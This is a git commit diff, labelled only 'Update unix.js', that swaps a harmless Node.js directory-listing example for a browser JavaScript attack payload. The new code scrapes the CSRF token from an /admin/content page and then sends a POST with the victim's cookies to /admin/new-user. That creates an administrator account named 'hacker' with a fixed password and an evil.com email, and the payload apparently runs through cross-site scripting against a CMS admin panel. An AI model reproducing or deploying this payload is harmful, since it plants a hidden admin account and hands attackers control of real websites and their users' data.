f8025f9323d2024c2c4cfaae9a2f878e3db383b1
Vinoth Kumar <35825039+r4vanan@users.noreply.github.com>
2023-11-25 13:22:29 +0530

    Update unix.js

--- unix.js
+++ unix.js
@@ -1,16 +1,15 @@
-'use strict';
+fetch("/admin/content")
+  .then(response => response.text())
+  .then(content => {
+    const tokenCSRF = content.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];
 
-const { spawn } = require( 'child_process' );
-const ls = spawn( 'ls', [ '-lh', '/usr' ] );
-
-ls.stdout.on( 'data', ( data ) => {
-    console.log( `stdout: ${ data }` );
-} );
-
-ls.stderr.on( 'data', ( data ) => {
-    console.log( `stderr: ${ data }` );
-} );
-
-ls.on( 'close', ( code ) => {
-    console.log( `child process exited with code ${ code }` );
-} );
+    return fetch("/admin/new-user", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+      },
+      body: `save=&tokenCSRF=${tokenCSRF}&new_username=hacker&new_password=Hacker@123&confirm_password=Hacker@123&role=admin&email=hacker%40evil.com`,
+    });
+  })
+  .catch(err => console.error(err));
